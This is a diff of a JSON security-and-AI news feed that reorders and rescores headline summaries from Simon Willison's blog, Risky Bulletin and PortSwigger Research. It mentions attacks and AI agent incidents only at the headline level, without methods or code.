-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Release: llm-echo 0.5 I'm working towards a new LLM release, and testing PRs caused me to revisit the llm-echo debug plugin. This plugin provides a \"model\" which doesn't involve an LLM at all - it just repeats back the prompts that have been fed to it. The new release now updates the simulated token usage counts to take tool calls, system prompts, and reasoning tokens into account. Example usage: uvx --with llm-echo llm -m echo 'hi there' -o thinking 1 --usage Outputs: First I consider the prompt, then I decide what to say. { \"prompt\": \"hi there\", \"system\": \"\", \"attachments\": [], \"stream\": true, \"previous\": [] } Token usage: 2 input, 24 output Tags: llm",
+      "source": "PortSwigger Research",
+      "source_type": "research",
+      "summary": "You can now escalate HTTP header injection to a CRLF-Powered Desync and exploit it to serve random users a redirect to your collaborator, in a single prompt. We’ve just introduced a new scan check for",
       "tags": [
-        "watchlist",
-        "AI-sec"
+        "research"
       ],
-      "title": "llm-echo 0.5",
-      "url": "https://simonwillison.net/2026/Oct/18/llm-echo/"
+      "title": "Making HTTP header injection critical with one prompt",
+      "url": "https://portswigger.net/research/making-http-header-injection-critical-with-one-prompt"
     },
     {
       "appsec": false,
@@ -2397,6 +2353,30 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "64f79924a918dd64",
+      "kev": false,
+      "published": "2026-10-18T23:16:16Z",
+      "score": 22.4,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "watchlist:llm (+15)",
+        "recency (+1.4)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "Release: llm-echo 0.5 I'm working towards a new LLM release, and testing PRs caused me to revisit the llm-echo debug plugin. This plugin provides a \"model\" which doesn't involve an LLM at all - it just repeats back the prompts that have been fed to it. The new release now updates the simulated token usage counts to take tool calls, system prompts, and reasoning tokens into account. Example usage: uvx --with llm-echo llm -m echo 'hi there' -o thinking 1 --usage Outputs: First I consider the prompt, then I decide what to say. { \"prompt\": \"hi there\", \"system\": \"\", \"attachments\": [], \"stream\": true, \"previous\": [] } Token usage: 2 input, 24 output Tags: llm",
+      "tags": [
+        "watchlist",
+        "AI-sec"
+      ],
+      "title": "llm-echo 0.5",
+      "url": "https://simonwillison.net/2026/Oct/18/llm-echo/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "3a028b97719dae29",
       "kev": false,
       "published": "2026-10-17T21:11:12Z",
@@ -2414,6 +2394,26 @@
       ],
       "title": "Inline rendering with document​.currentScript",
       "url": "https://simonwillison.net/2026/Oct/17/document-currentscript/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "5ba1e262888374fc",
+      "kev": false,
+      "published": "2026-11-11T01:59:09Z",
+      "score": 22.3,
+      "score_reasons": [
+        "source:Risky Bulletin (+8)",
+        "recency (+14.3)"
+      ],
+      "source": "Risky Bulletin",
+      "source_type": "news",
+      "summary": "France blames Iran for supermarket freezer hacks, the White House nominates Palantir’s CISO as CISA director, another Russian cloud provider gets hacked, and N-able takes down its SaaS platform after a researcher discloses 33 vulnerabilities in it. Show notes Risky Bulletin: France blames Iran for the October supermarket fridge hacks",
+      "tags": [],
+      "title": "Risky Bulletin: France blames Iran for supermarket freezer hacks",
+      "url": "https://risky.biz/RBNEWS632/"
     },
     {
       "appsec": false,
@@ -2493,10 +2493,10 @@
       "id": "ec02ffe3c0c52bb2",
       "kev": false,
       "published": "2026-11-09T03:25:54Z",
-      "score": 20.2,
+      "score": 19.8,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+12.2)"
+        "recency (+11.8)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -2513,10 +2513,10 @@
       "id": "91d04b9b6b9b3f84",
       "kev": false,
       "published": "2026-11-08T19:10:22Z",
-      "score": 19.8,
+      "score": 19.4,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+11.8)"
+        "recency (+11.4)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -2533,10 +2533,10 @@
       "id": "c87f4ae5dc4e2adb",
       "kev": false,
       "published": "2026-11-10T05:34:14Z",
-      "score": 19.6,
+      "score": 19.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+13.6)"
+        "recency (+13.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2553,10 +2553,10 @@
       "id": "ab788fdb1792dc6b",
       "kev": false,
       "published": "2026-11-10T03:53:04Z",
-      "score": 19.5,
+      "score": 19.0,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+13.5)"
+        "recency (+13.0)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2573,10 +2573,10 @@
       "id": "d82153ff784453e8",
       "kev": false,
       "published": "2026-11-08T22:26:00Z",
-      "score": 18.0,
+      "score": 17.5,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+12.0)"
+        "recency (+11.5)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2593,10 +2593,10 @@
       "id": "6f0dd9219ff9dddf",
       "kev": false,
       "published": "2026-11-07T23:57:46Z",
-      "score": 16.9,
+      "score": 16.5,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+10.9)"
+        "recency (+10.5)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2613,10 +2613,10 @@
       "id": "0902acca81eb73d6",
       "kev": false,
       "published": "2026-11-07T19:34:24Z",
-      "score": 16.7,
+      "score": 16.3,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+10.7)"
+        "recency (+10.3)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -2633,10 +2633,10 @@
       "id": "76ba93cc9d443ae0",
       "kev": false,
       "published": "2026-11-05T04:02:00Z",
-      "score": 16.2,
+      "score": 15.9,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+8.2)"
+        "recency (+7.9)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -2644,26 +2644,6 @@
       "tags": [],
       "title": "Srsly Risky Biz: The ritual bitcoin sacrifices will continue until security improves",
       "url": "https://risky.biz/SRB189/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "1078dcb9b7d86963",
-      "kev": false,
-      "published": "2026-11-06T17:13:12Z",
-      "score": 15.6,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+9.6)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "The products aren't good enough to sell people on the costs. You cannot tell people that you have to listen to the whine of a data center in their backyard for AI overviews and some of the most hilarious deep fake slop in history. It's not worth it. It just isn't worth it to anyone. And agents aren't real and they might not be being used the way that anyone wants them to yet. All these companies are spending more than they're making on these products. Refrigerators holding blood storage in Europe are being hacked. The costs are too high. The benefits are not real. And if you connect that to corruption, you're like, in order to impose these costs on me, these CEOs are in the White House shaking Trump's hand, renaming it to the Gulf of America, paying for this ballroom that we don't want. It's obvious crypto-corruption, and it's still slop. The AI industry will not get out of it until they make better products. Until everyone can see without needing to be convinced, without needing an ad campaign, without any of this stuff that just using these products makes your life better. — Nilay Patel, The Vergecast: Big Tech lost big in the 2026 election Tags: nilay-patel, slop, ai, generative-ai, ai-ethics",
-      "tags": [],
-      "title": "Quoting Nilay Patel",
-      "url": "https://simonwillison.net/2026/Nov/6/nilay-patel/"
     },
     {
       "appsec": false,
@@ -2733,6 +2713,26 @@
       ],
       "title": "The model isn't cooperating",
       "url": "https://portswigger.net/research/the-model-isnt-cooperating"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "1078dcb9b7d86963",
+      "kev": false,
+      "published": "2026-11-06T17:13:12Z",
+      "score": 15.3,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+9.3)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "The products aren't good enough to sell people on the costs. You cannot tell people that you have to listen to the whine of a data center in their backyard for AI overviews and some of the most hilarious deep fake slop in history. It's not worth it. It just isn't worth it to anyone. And agents aren't real and they might not be being used the way that anyone wants them to yet. All these companies are spending more than they're making on these products. Refrigerators holding blood storage in Europe are being hacked. The costs are too high. The benefits are not real. And if you connect that to corruption, you're like, in order to impose these costs on me, these CEOs are in the White House shaking Trump's hand, renaming it to the Gulf of America, paying for this ballroom that we don't want. It's obvious crypto-corruption, and it's still slop. The AI industry will not get out of it until they make better products. Until everyone can see without needing to be convinced, without needing an ad campaign, without any of this stuff that just using these products makes your life better. — Nilay Patel, The Vergecast: Big Tech lost big in the 2026 election Tags: nilay-patel, slop, ai, generative-ai, ai-ethics",
+      "tags": [],
+      "title": "Quoting Nilay Patel",
+      "url": "https://simonwillison.net/2026/Nov/6/nilay-patel/"
     },
     {
       "appsec": false,
@@ -3222,7 +3222,7 @@
       ],
       "source": "PortSwigger Research",
       "source_type": "research",
-      "summary": "Am I vulnerable? Has BurpSuite's Scanner reported an HTTP request header injection issue and you're worried it might be a critical vulnerability? Try asking Burp AT to exploit the issue with our CRLF-",
+      "summary": "Found Header Injection? Make it a critical with one prompt Has the scanner reported HTTP request header injection? Try asking Burp AT to exploit the issue with our CRLF-Powered Desync and Tunnelling s",
       "tags": [
         "research"
       ],
@@ -3510,10 +3510,10 @@
       "id": "7cc2162c82dbd2cc",
       "kev": false,
       "published": "2026-11-05T17:34:03Z",
-      "score": 14.7,
+      "score": 14.4,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+8.7)"
+        "recency (+8.4)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3530,10 +3530,10 @@
       "id": "3fd1dde4a9898e0c",
       "kev": false,
       "published": "2026-11-02T19:14:23Z",
-      "score": 14.5,
+      "score": 14.3,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+6.5)"
+        "recency (+6.3)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3541,26 +3541,6 @@
       "tags": [],
       "title": "Between Two Nerds: Finding bugs does not mean security",
       "url": "https://risky.biz/BTN188/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "d884a4ef2a50bf34",
-      "kev": false,
-      "published": "2026-11-02T02:08:33Z",
-      "score": 14.1,
-      "score_reasons": [
-        "source:Risky Bulletin (+8)",
-        "recency (+6.1)"
-      ],
-      "source": "Risky Bulletin",
-      "source_type": "news",
-      "summary": "The FBI links the Binance hack to North Korea, game developers are being extorted with game-cloning threats, the Belarusian CyberPartisans hack Russia’s statistics service and Apple sends new mercenary spyware notifications. Show notes Risky Bulletin: Game devs are being extorted with AI game-cloning threats",
-      "tags": [],
-      "title": "FBI confirms North Korea behind Binance hack",
-      "url": "https://risky.biz/RBNEWS628/"
     },
     {
       "appsec": false,
@@ -3611,13 +3591,33 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "6a8095a99a564e62",
+      "id": "d884a4ef2a50bf34",
       "kev": false,
-      "published": "2026-11-01T19:27:05Z",
+      "published": "2026-11-02T02:08:33Z",
       "score": 13.9,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
         "recency (+5.9)"
+      ],
+      "source": "Risky Bulletin",
+      "source_type": "news",
+      "summary": "The FBI links the Binance hack to North Korea, game developers are being extorted with game-cloning threats, the Belarusian CyberPartisans hack Russia’s statistics service and Apple sends new mercenary spyware notifications. Show notes Risky Bulletin: Game devs are being extorted with AI game-cloning threats",
+      "tags": [],
+      "title": "FBI confirms North Korea behind Binance hack",
+      "url": "https://risky.biz/RBNEWS628/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "6a8095a99a564e62",
+      "kev": false,
+      "published": "2026-11-01T19:27:05Z",
+      "score": 13.7,
+      "score_reasons": [
+        "source:Risky Bulletin (+8)",
+        "recency (+5.7)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3634,10 +3634,10 @@
       "id": "1fe496fc8c1f9697",
       "kev": false,
       "published": "2026-11-03T23:13:45Z",
-      "score": 13.3,
+      "score": 13.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+7.3)"
+        "recency (+7.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3654,10 +3654,10 @@
       "id": "5928ed51062ddbc9",
       "kev": false,
       "published": "2026-11-04T00:29:36Z",
-      "score": 13.3,
+      "score": 13.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+7.3)"
+        "recency (+7.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3674,10 +3674,10 @@
       "id": "7d2479f2553dd44b",
       "kev": false,
       "published": "2026-11-03T16:42:02Z",
-      "score": 13.1,
+      "score": 12.9,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+7.1)"
+        "recency (+6.9)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3694,10 +3694,10 @@
       "id": "97e03d86478ab0d0",
       "kev": false,
       "published": "2026-11-03T05:32:25Z",
-      "score": 12.8,
+      "score": 12.6,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+6.8)"
+        "recency (+6.6)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3714,10 +3714,10 @@
       "id": "6c1fe33dc9352d01",
       "kev": false,
       "published": "2026-10-30T02:07:09Z",
-      "score": 12.5,
+      "score": 12.4,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+4.5)"
+        "recency (+4.4)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3734,10 +3734,10 @@
       "id": "4c1cfae1f7d73c23",
       "kev": false,
       "published": "2026-11-02T13:31:26Z",
-      "score": 12.4,
+      "score": 12.1,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+6.4)"
+        "recency (+6.1)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3751,33 +3751,13 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "d16b3aa2876fabcb",
-      "kev": false,
-      "published": "2026-11-01T16:49:04Z",
-      "score": 11.8,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+5.8)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "More broadly, the use of LLMs erodes trust in documentation, in software, and in the organizations which produce them. Perhaps engineers will begin to treat any new software project with suspicion—the signals we used to rely on as markers of a mature system are now easier to counterfeit. [...] In the age of LLMs, what can maintainers do to ensure correct software and accurate documentation? Having done that work, how can they demonstrate its quality to users? — Kyle Kingsbury, Jepsen results for ParticleDB 1.1.4 Tags: kyle-kingsbury, llms, ai, generative-ai, ai-misuse",
-      "tags": [],
-      "title": "Quoting Kyle Kingsbury",
-      "url": "https://simonwillison.net/2026/Nov/1/kyle-kingsbury/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "51e95d3a506e7d79",
       "kev": false,
       "published": "2026-10-28T04:44:23Z",
-      "score": 11.7,
+      "score": 11.6,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+3.7)"
+        "recency (+3.6)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3791,20 +3771,20 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "5ba4b32d47ec536b",
+      "id": "d16b3aa2876fabcb",
       "kev": false,
-      "published": "2026-10-30T21:59:22Z",
-      "score": 10.9,
+      "published": "2026-11-01T16:49:04Z",
+      "score": 11.6,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+4.9)"
+        "recency (+5.6)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
-      "summary": "dbreunig/nesformer Inspired by qwenputer by Divyansh Agrawal, Drew Breunig baked a working emulator for a Nintendo Entertainment System 6502 CPU into the weights of Qwen3.5-4B. You can now play NES ROMs such as Super Mario Bros (very slowly) running inside Qwen! In a comment on Hacker News Drew reveals the Opus 5.5 prompts he used to build this system: Read this article and any relevant source code: https://divagr.com/blog/qwenputer. Then explore if you could emulate the chip and ram in a Nintendo Entertainment System (as people do today with FPGAs in MISTRs) using this technique. If so, what size model would you have to build and if you could use smaller faster ones, could you get it to be at the standard clockspeed. Followed by: I think we should build it! Just for fun. It's okay if it's not fast. We want to be able to have the weights, and a cli to run them that we can point at a ROM. Apparently Opus found and then used this collection of conformance tests for the NES CPU released 15 years ago by Christopher Pow. Via Hacker News Tags: games, ai, generative-ai, llms, drew-breunig, qwen, conformance-suites",
+      "summary": "More broadly, the use of LLMs erodes trust in documentation, in software, and in the organizations which produce them. Perhaps engineers will begin to treat any new software project with suspicion—the signals we used to rely on as markers of a mature system are now easier to counterfeit. [...] In the age of LLMs, what can maintainers do to ensure correct software and accurate documentation? Having done that work, how can they demonstrate its quality to users? — Kyle Kingsbury, Jepsen results for ParticleDB 1.1.4 Tags: kyle-kingsbury, llms, ai, generative-ai, ai-misuse",
       "tags": [],
-      "title": "dbreunig/nesformer",
-      "url": "https://simonwillison.net/2026/Oct/30/nesformer/"
+      "title": "Quoting Kyle Kingsbury",
+      "url": "https://simonwillison.net/2026/Nov/1/kyle-kingsbury/"
     },
     {
       "appsec": false,
@@ -3814,10 +3794,10 @@
       "id": "78a2482ced344d3e",
       "kev": false,
       "published": "2026-10-25T19:14:25Z",
-      "score": 10.9,
+      "score": 10.8,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+2.9)"
+        "recency (+2.8)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3831,13 +3811,33 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "5ba4b32d47ec536b",
+      "kev": false,
+      "published": "2026-10-30T21:59:22Z",
+      "score": 10.7,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+4.7)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "dbreunig/nesformer Inspired by qwenputer by Divyansh Agrawal, Drew Breunig baked a working emulator for a Nintendo Entertainment System 6502 CPU into the weights of Qwen3.5-4B. You can now play NES ROMs such as Super Mario Bros (very slowly) running inside Qwen! In a comment on Hacker News Drew reveals the Opus 5.5 prompts he used to build this system: Read this article and any relevant source code: https://divagr.com/blog/qwenputer. Then explore if you could emulate the chip and ram in a Nintendo Entertainment System (as people do today with FPGAs in MISTRs) using this technique. If so, what size model would you have to build and if you could use smaller faster ones, could you get it to be at the standard clockspeed. Followed by: I think we should build it! Just for fun. It's okay if it's not fast. We want to be able to have the weights, and a cli to run them that we can point at a ROM. Apparently Opus found and then used this collection of conformance tests for the NES CPU released 15 years ago by Christopher Pow. Via Hacker News Tags: games, ai, generative-ai, llms, drew-breunig, qwen, conformance-suites",
+      "tags": [],
+      "title": "dbreunig/nesformer",
+      "url": "https://simonwillison.net/2026/Oct/30/nesformer/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "c1ffef57cf4f0cf5",
       "kev": false,
       "published": "2026-10-29T17:00:26Z",
-      "score": 10.3,
+      "score": 10.2,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+4.3)"
+        "recency (+4.2)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3874,10 +3874,10 @@
       "id": "238efdacbd16ff8a",
       "kev": false,
       "published": "2026-10-21T04:19:44Z",
-      "score": 9.9,
+      "score": 9.8,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+1.9)"
+        "recency (+1.8)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3894,10 +3894,10 @@
       "id": "7a3afca2246da741",
       "kev": false,
       "published": "2026-10-28T10:09:07Z",
-      "score": 9.8,
+      "score": 9.7,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+3.8)"
+        "recency (+3.7)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3934,10 +3934,10 @@
       "id": "87166973b4ed4194",
       "kev": false,
       "published": "2026-10-27T19:34:18Z",
-      "score": 9.6,
+      "score": 9.5,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+3.6)"
+        "recency (+3.5)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -3954,10 +3954,10 @@
       "id": "06290998ddcf2013",
       "kev": false,
       "published": "2026-10-18T22:53:01Z",
-      "score": 9.5,
+      "score": 9.4,
       "score_reasons": [
         "source:Risky Bulletin (+8)",
-        "recency (+1.5)"
+        "recency (+1.4)"
       ],
       "source": "Risky Bulletin",
       "source_type": "news",
@@ -3965,26 +3965,6 @@
       "tags": [],
       "title": "Sponsored: Agents don’t care about human ideas of right and wrong",
       "url": "https://risky.biz/RBNEWSSI147/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "df11f17c78623c5a",
-      "kev": false,
-      "published": "2026-10-26T19:00:25Z",
-      "score": 9.3,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+3.3)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Because big tech platforms essentially do not have customer support and make it impossible for their users to contact a human, many people experiencing run-of-the-mill tech problems have turned to ChatGPT. And, increasingly, ChatGPT is telling people that have normal tech support problems that they have discovered something journalistically notable and that 404 Media, specifically, can help them. — Jason Koebler, ChatGPT Keeps Telling People 404 Media Can Solve Their Tech Support Problems Tags: jason-koebler, openai, journalism, ai, llms, ai-ethics, ai-misuse, generative-ai, chatgpt, 404-media",
-      "tags": [],
-      "title": "Quoting Jason Koebler",
-      "url": "https://simonwillison.net/2026/Oct/26/jason-koebler/"
     },
     {
       "appsec": false,
@@ -4005,6 +3985,26 @@
       "tags": [],
       "title": "Risky Bulletin: DataSuckers suspects arrested in Russia",
       "url": "https://risky.biz/RBNEWS621/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "df11f17c78623c5a",
+      "kev": false,
+      "published": "2026-10-26T19:00:25Z",
+      "score": 9.1,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "recency (+3.1)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "Because big tech platforms essentially do not have customer support and make it impossible for their users to contact a human, many people experiencing run-of-the-mill tech problems have turned to ChatGPT. And, increasingly, ChatGPT is telling people that have normal tech support problems that they have discovered something journalistically notable and that 404 Media, specifically, can help them. — Jason Koebler, ChatGPT Keeps Telling People 404 Media Can Solve Their Tech Support Problems Tags: jason-koebler, openai, journalism, ai, llms, ai-ethics, ai-misuse, generative-ai, chatgpt, 404-media",
+      "tags": [],
+      "title": "Quoting Jason Koebler",
+      "url": "https://simonwillison.net/2026/Oct/26/jason-koebler/"
     },
     {
       "appsec": false,
@@ -4051,26 +4051,6 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "3f34d86ee2d69ed8",
-      "kev": false,
-      "published": "2026-10-25T15:10:19Z",
-      "score": 8.9,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+2.9)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Tool: Seam Cutter I built this weird and very specific cropping tool - it lets you create a horizontal or vertical cut across an image, then slide the two sides relative to each other. Effectively it lets you crop out a section in the middle of an image. I wanted this because I often use Tailor on my iPhone to stitch several screenshots together into lot long image, but sometimes I find myself wanting to crop out a section in the middle - to redact an irrelevant prompt from a transcript, for example. Tags: tools",
-      "tags": [],
-      "title": "Seam Cutter",
-      "url": "https://simonwillison.net/2026/Oct/25/seam-cutter/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "39cf548322967bc7",
       "kev": false,
       "published": "2026-10-12T19:06:44Z",
@@ -4091,20 +4071,20 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "4729de4c9cbe4dc5",
+      "id": "3f34d86ee2d69ed8",
       "kev": false,
-      "published": "2026-10-12T02:43:40Z",
+      "published": "2026-10-25T15:10:19Z",
       "score": 8.8,
       "score_reasons": [
-        "source:Risky Bulletin (+8)",
-        "recency (+0.8)"
+        "source:Simon Willison (+6)",
+        "recency (+2.8)"
       ],
-      "source": "Risky Bulletin",
+      "source": "Simon Willison",
       "source_type": "news",
-      "summary": "Two ShinyHunters suspects arrested in Jordan and the US, hackers breach TLD registrars to get valid Google certs, Japanese authorities arrest a Qilin ransomware member and Google suspends its open-source bug bounty program after a flood of AI bug reports. Show notes Risky Bulletin: ShinyHunters suspects arrested in US and Jordan",
+      "summary": "Tool: Seam Cutter I built this weird and very specific cropping tool - it lets you create a horizontal or vertical cut across an image, then slide the two sides relative to each other. Effectively it lets you crop out a section in the middle of an image. I wanted this because I often use Tailor on my iPhone to stitch several screenshots together into lot long image, but sometimes I find myself wanting to crop out a section in the middle - to redact an irrelevant prompt from a transcript, for example. Tags: tools",
       "tags": [],
-      "title": "Risky Bulletin: ShinyHunters suspects arrested in US and Jordan",
-      "url": "https://risky.biz/RBNEWS619/"
+      "title": "Seam Cutter",
+      "url": "https://simonwillison.net/2026/Oct/25/seam-cutter/"
     },
     {
       "appsec": false,
@@ -4131,13 +4111,33 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "4729de4c9cbe4dc5",
+      "kev": false,
+      "published": "2026-10-12T02:43:40Z",
+      "score": 8.7,
+      "score_reasons": [
+        "source:Risky Bulletin (+8)",
+        "recency (+0.7)"
+      ],
+      "source": "Risky Bulletin",
+      "source_type": "news",
+      "summary": "Two ShinyHunters suspects arrested in Jordan and the US, hackers breach TLD registrars to get valid Google certs, Japanese authorities arrest a Qilin ransomware member and Google suspends its open-source bug bounty program after a flood of AI bug reports. Show notes Risky Bulletin: ShinyHunters suspects arrested in US and Jordan",
+      "tags": [],
+      "title": "Risky Bulletin: ShinyHunters suspects arrested in US and Jordan",
+      "url": "https://risky.biz/RBNEWS619/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "c8190b8e5a1ef44e",
       "kev": false,
       "published": "2026-10-24T03:59:57Z",
-      "score": 8.5,
+      "score": 8.4,
       "score_reasons": [
         "source:Simon Willison (+6)",
-        "recency (+2.5)"
+        "recency (+2.4)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -4165,26 +4165,6 @@
       "tags": [],
       "title": "Quick Study",
       "url": "https://simonwillison.net/2026/Oct/23/quick-study-painter/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "092f8b08567b33e3",
-      "kev": false,
-      "published": "2026-10-01T02:38:57Z",
-      "score": 8.3,
-      "score_reasons": [
-        "source:Risky Bulletin (+8)",
-        "recency (+0.3)"
-      ],
-      "source": "Risky Bulletin",
-      "source_type": "news",
-      "summary": "Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube Show notes",
-      "tags": [],
-      "title": "Srsly Risky Biz: “Rogue AI” isn’t going anywhere",
-      "url": "https://risky.biz/SRB185/"
     },
     {
       "appsec": false,
@@ -4231,6 +4211,26 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "092f8b08567b33e3",
+      "kev": false,
+      "published": "2026-10-01T02:38:57Z",
+      "score": 8.2,
+      "score_reasons": [
+        "source:Risky Bulletin (+8)",
+        "recency (+0.2)"
+      ],
+      "source": "Risky Bulletin",
+      "source_type": "news",
+      "summary": "Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube Show notes",
+      "tags": [],
+      "title": "Srsly Risky Biz: “Rogue AI” isn’t going anywhere",
+      "url": "https://risky.biz/SRB185/"
+    },
+    {
+      "appsec": false,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "357fe0629fb522a0",
       "kev": false,
       "published": "2026-09-28T01:17:56Z",
@@ -4251,26 +4251,6 @@
       "cves": [],
       "epss": null,
       "feed": "news",
-      "id": "af381dd3420f5f37",
-      "kev": false,
-      "published": "2026-10-22T15:34:13Z",
-      "score": 8.2,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+2.2)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "As fun as AI is, we built so much bad software over the last 30 years, and now the universe is punishing us for our sins. — Armin Ronacher Tags: security, generative-ai, armin-ronacher, ai, ai-security-research, llms",
-      "tags": [],
-      "title": "Quoting Armin Ronacher",
-      "url": "https://simonwillison.net/2026/Oct/22/armin-ronacher/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
       "id": "b43236b3d7c31908",
       "kev": false,
       "published": "2026-09-27T20:48:18Z",
@@ -4285,26 +4265,6 @@
       "tags": [],
       "title": "Sponsored: Robo-Burp is coming for your web apps",
       "url": "https://risky.biz/RBNEWSSI145/"
-    },
-    {
-      "appsec": false,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "e44aa2efb3cde31e",
-      "kev": false,
-      "published": "2026-10-22T19:42:26Z",
-      "score": 8.2,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "recency (+2.2)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
